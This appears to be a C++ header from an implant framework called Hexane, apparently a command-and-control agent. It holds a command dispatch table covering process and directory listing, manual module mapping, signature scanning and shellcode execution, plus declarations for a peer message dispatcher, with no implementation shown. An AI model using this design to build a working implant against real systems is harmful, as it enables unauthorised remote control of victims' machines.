#ifndef HEXANE_CORELIB_MESSAGE_HPP
#define HEXANE_CORELIB_MESSAGE_HPP
#include <core/corelib.hpp>

_code_seg(".rdata") _command_map cmd_map[] = {
    { .name = DIRECTORYLIST,            .address = Commands::DirectoryList },
    { .name = PROCESSMODULES,           .address = Commands::ProcessModules },
    { .name = PROCESSLIST,              .address = Commands::ProcessList },
    { .name = SHUTDOWN,                 .address = Commands::Shutdown },
    { .name = UPDATEPEER,               .address = Commands::UpdatePeer },
    { .name = MOVEFILEPOINTER,          .address = Memory::Methods::MoveFilePointer },
    { .name = GETSTACKCOOKIE,           .address = Memory::Methods::GetStackCookie },
    { .name = GETPROCESSHEAPS,          .address = Memory::Methods::GetProcessHeaps },
    { .name = GETINTRESOURCE,           .address = Memory::Methods::GetIntResource },
    { .name = CREATEIMAGEDATA,          .address = Memory::Methods::CreateImageData },
    { .name = RESOLVEAPI,               .address = Memory::Context::ResolveApi },
    { .name = CONTEXTINIT,              .address = Memory::Context::ContextInit },
    { .name = CONTEXTDESTROY,           .address = Memory::Context::ContextDestroy },
    { .name = GETINTERNALADDRESS,       .address = Memory::Objects::GetInternalAddress },
    { .name = RESOLVESYMBOL,            .address = Memory::Objects::ResolveSymbol },
    { .name = MAPSECTIONS,              .address = Memory::Objects::MapSections },
    { .name = BASERELOCATION,           .address = Memory::Objects::BaseRelocation },
    { .name = GETMODULEADDRESS,         .address = Memory::Modules::GetModuleAddress },
    { .name = GETMODULEENTRY,           .address = Memory::Modules::GetModuleEntry },
    { .name = GETEXPORTADDRESS,         .address = Memory::Modules::GetExportAddress },
    { .name = LOADEXPORT,               .address = Memory::Modules::LoadExport },
    { .name = RELOCATEEXPORT,           .address = Memory::Scanners::RelocateExport },
    { .name = SIGCOMPARE,               .address = Memory::Scanners::SigCompare },
    { .name = SIGNATURESCAN,            .address = Memory::Scanners::SignatureScan},
    { .name = EXECUTEOBJECT,            .address = Memory::Execute::ExecuteObject },
    { .name = EXECUTECOMMAND,           .address = Memory::Execute::ExecuteCommand },
    { .name = EXECUTESHELLCODE,         .address = Memory::Execute::ExecuteShellcode },
    { .name = nullptr,                  .address = nullptr }
};

namespace Dispatcher {
    FUNCTION BOOL PeekPeerId(const _stream *stream);
    FUNCTION VOID AddMessage(_stream *out);
    FUNCTION VOID RemoveMessage(_stream *target);
    FUNCTION VOID OutboundQueue(_stream *out);
    FUNCTION VOID QueueSegments(uint8_t *buffer, uint32_t length);
    FUNCTION BOOL PrepareQueue(_stream *out);
    FUNCTION VOID MessageTransmit();
    FUNCTION VOID CommandDispatch (const _stream *in);
}
#endif //HEXANE_CORELIB_MESSAGE_HPP

